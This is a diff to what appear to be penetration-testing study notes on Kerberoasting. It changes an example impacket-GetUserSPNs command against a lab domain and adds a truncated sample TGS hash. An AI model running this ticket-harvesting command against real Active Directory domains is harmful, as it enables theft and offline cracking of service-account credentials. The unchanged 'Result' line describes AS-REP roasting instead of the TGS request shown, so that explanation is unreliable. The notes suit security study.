@@ -10,7 +10,11 @@ impacket-GetUserSPNs -request -dc-ip <DomainController_IP>  -outputfile <output_
 - **-request** to obtain the TGS
 Example:
 ``` shell
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.50 corp.com/ahmed
+```
+HashShape
+```
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$9b161bcb9f98f19b.......a85ee4
 ```
 
 2. **Result**: This command will send AS-REQ requests to the domain controller and retrieve the AS-REP hashes (if preauthentication is disabled for the user accounts). The hashes are saved in [[Hashcat]] format in the output file (`hashes.asreproast`).
